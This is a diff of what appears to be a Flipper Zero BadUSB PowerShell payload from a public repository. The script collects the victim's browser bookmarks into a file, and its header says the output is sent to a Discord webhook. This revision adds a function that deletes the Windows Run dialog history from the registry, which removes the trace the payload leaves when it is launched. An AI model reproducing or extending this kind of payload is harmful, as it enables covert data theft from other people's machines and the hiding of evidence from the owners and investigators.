@@ -9,11 +9,11 @@
     The output will be sent to Discord if you provide a valid Webhook URL.
 
 .NOTES
-    Version:    0.1
+    Version:    0.2
 
     Author:     Contrxl
 
-    Updated:    12/06/2024      -First version of standalone script.
+    Updated:    25/01/2025      Added cleanup of run.msc history..
 
 .LINK 
     https://github.com/contrxl/flipper-stuff/tree/main/badusb
@@ -105,6 +105,10 @@ function readBookmarks{
 $bookmark = readBookmarks
 $bookmark >> $FileName
 
+<#
+.SYNOPSIS
+This function clears the history of run.msc by deleting the registry keys under "MRUList".
+#>
 function clearRunHistory{
     $runReg = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
     if (Get-ItemProperty $runReg | Select-Object -ExpandProperty "MRUList"){
